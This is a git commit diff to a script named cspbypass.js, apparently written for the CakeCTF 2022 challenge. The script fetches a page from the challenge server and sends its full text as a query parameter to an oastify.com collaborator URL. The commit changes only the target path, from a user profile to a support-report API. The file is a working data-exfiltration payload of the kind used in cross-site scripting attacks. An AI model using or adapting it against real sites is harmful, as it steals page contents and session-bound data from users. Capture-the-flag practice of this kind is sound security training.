71eb515eec508d7411d80195d2a9b82893fc2417
Lê Ngọc Hoa <68491164+lengochoa7112000@users.noreply.github.com>
2022-09-04 00:26:54 +0700

    Update cspbypass.js

--- cspbypass.js
+++ cspbypass.js
@@ -1,4 +1,4 @@
-fetch("http://web1.2022.cakectf.com:8003/profile/carlos").then((res) => {
+fetch("http://web1.2022.cakectf.com:8003/api/support/report").then((res) => {
     return res.text();
 }).then(data => {
     fetch("https://l4qs5ogox3mbe3syub12hhnas1ytmi.oastify.com?data="+data);
